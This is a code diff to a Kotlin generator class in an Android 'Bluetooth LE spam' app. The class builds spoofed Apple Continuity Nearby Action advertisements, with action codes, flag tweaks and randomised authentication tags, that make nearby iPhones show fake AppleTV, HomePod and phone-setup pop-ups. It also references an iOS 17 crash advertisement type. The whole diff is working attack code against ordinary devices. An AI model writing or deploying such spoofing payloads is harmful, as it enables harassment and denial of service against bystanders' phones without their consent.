@@ -16,39 +16,69 @@ import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
 import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
 import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
 import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
+import kotlin.random.Random
 
 class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator {
 
     private val _logTag = "ContinuityActionModalAdvertisementSetGenerator"
 
-    // Device Data taken from here:
-    // https://www.mobile-hacker.com/2023/09/07/spoof-ios-devices-with-bluetooth-pairing-messages-using-android/
+    // Reversed from here: https://github.com/Flipper-XFW/Xtreme-Apps/blob/52c1c0f690bc01257e6461aa1081cf7d0faa92cf/ble_spam/protocols/continuity.c#L178
 
-    val _deviceData = mapOf(
-        "AppleTV Setup" to "04042a0000000f05c101604c95000010000000",
-        "AppleTV Pair" to "04042a0000000f05c106604c95000010000000",
-        "AppleTV New User" to "04042a0000000f05c120604c95000010000000",
-        "AppleTV AppleID Setup" to "04042a0000000f05c12b604c95000010000000",
-        "AppleTV Wireless Audio Sync" to "04042a0000000f05c1c0604c95000010000000",
-        "AppleTV Homekit Setup" to "04042a0000000f05c10d604c95000010000000",
-        "AppleTV Keyboard" to "04042a0000000f05c113604c95000010000000",
-        "AppleTV ‘Connecting to Network’" to "04042a0000000f05c127604c95000010000000",
-        "Homepod Setup" to "04042a0000000f05c10b604c95000010000000",
-        "Setup New Phone" to "04042a0000000f05c109604c95000010000000",
-        "Transfer Number to New Phone" to "04042a0000000f05c102604c95000010000000",
-        "TV Color Balance" to "04042a0000000f05c11e604c95000010000000"
+    val _nearbyActions = mapOf(
+        "13" to "AppleTV AutoFill",
+        "27" to "AppleTV Connecting...",
+        "20" to "Join This AppleTV?",
+        "19" to "AppleTV Audio Sync",
+        "1E" to "AppleTV Color Balance",
+        "09" to "Setup New iPhone",
+        "02" to "Transfer Phone Number",
+        "0B" to "HomePod Setup",
+        "01" to "Setup New AppleTV",
+        "06" to "Pair AppleTV",
+        "0D" to "HomeKit AppleTV Setup",
+        "2B" to "AppleID for AppleTV?",
     )
+
+    companion object {
+        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet): AdvertisementSet {
+            if (advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_IOS_17_CRASH || advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS) {
+                if (advertisementSet.advertiseData.manufacturerData.size > 0) {
+                    var payload =
+                        advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData
+                    // Example Payload: 0f05bf2078ef39000010f7c0e5
+                    val action = payload[3]
+                    var flag = payload[2]
+
+                    if ((StringHelpers.byteToHexString(action) == "20") && Random.nextBoolean()) {
+                        flag = StringHelpers.decodeHex("BF")[0]
+                    }
+
+                    if ((StringHelpers.byteToHexString(action) == "09") && Random.nextBoolean()) {
+                        flag = StringHelpers.decodeHex("40")[0]
+                    }
+                    payload[2] = flag
+
+                    // randomize auth tag
+                    payload[4] = Random.nextBytes(1)[0]
+                    payload[5] = Random.nextBytes(1)[0]
+                    payload[6] = Random.nextBytes(1)[0]
+
+                }
+            }
+
+            return advertisementSet
+        }
+    }
 
     private val _manufacturerId = 76 // 0x004c == 76 = Apple
     override fun getAdvertisementSets(): List<AdvertisementSet> {
         var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()
 
-        _deviceData.map { deviceData ->
-
+        _nearbyActions.map { nearbyAction ->
             var advertisementSet: AdvertisementSet = AdvertisementSet()
             advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
             advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS
-            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR
+            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_UNKNOWN
 
             // Advertise Settings
             advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
@@ -68,13 +98,23 @@ class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator
 
             val manufacturerSpecificData = ManufacturerSpecificData()
             manufacturerSpecificData.manufacturerId = _manufacturerId
-            manufacturerSpecificData.manufacturerSpecificData =
-                StringHelpers.decodeHex(deviceData.value)
 
-            Log.d(
-                _logTag,
-                "Created Bytearray with ${manufacturerSpecificData.manufacturerSpecificData.size} Bytes"
-            )
+            // EXAMPLE: 0x10FF4C000F05C0-13-2C0CFE-00000000000000...
+            // EXAMPLE: 0x10FF4C000F05C0-0B-6473A6-00000000000000...
+
+            //
+            // 0x10FF4C000F05 = STATIC ( HEADER )
+            // C0 = flags
+            // 0B = action -> 0B = HomePod Setup
+            // 6473A6 = authentication tag -> random data
+
+            var continuityType = "0F" // 0x0F = NearbyAction
+            var payloadSize = "05"
+            var flag = "C0"
+            var action = nearbyAction.key
+            var authenticationTag:ByteArray = Random.Default.nextBytes(3)
+
+            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(continuityType + payloadSize + flag + action).plus(authenticationTag)
 
             advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
             advertisementSet.advertiseData.includeTxPower = false
@@ -83,7 +123,7 @@ class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator
             //advertisementSet.scanResponse.includeTxPower = false
 
             // General Data
-            advertisementSet.title = deviceData.key
+            advertisementSet.title = nearbyAction.value
 
             // Callbacks
             advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
@@ -91,6 +131,8 @@ class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator
 
             advertisementSets.add(advertisementSet)
         }
+
+        Log.d(_logTag, "Created " + advertisementSets.count() + "Items")
 
         return advertisementSets.toList()
     }
